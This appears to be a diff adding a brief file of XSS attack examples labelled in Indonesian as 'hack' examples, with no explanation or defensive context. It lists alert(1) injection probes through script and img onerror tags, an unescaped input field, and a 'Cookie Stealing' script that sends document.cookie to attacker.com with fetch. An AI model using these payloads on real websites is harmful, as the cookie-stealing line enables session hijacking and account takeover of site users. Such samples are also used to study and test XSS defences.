@@ -1,0 +1,9 @@
+Contoh Hack penyerangan XSS:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<input value="USER_INPUT">
+
+Cookie Stealing:
+<script>
+fetch('http://attacker.com/?c='+document.cookie)
+</script>
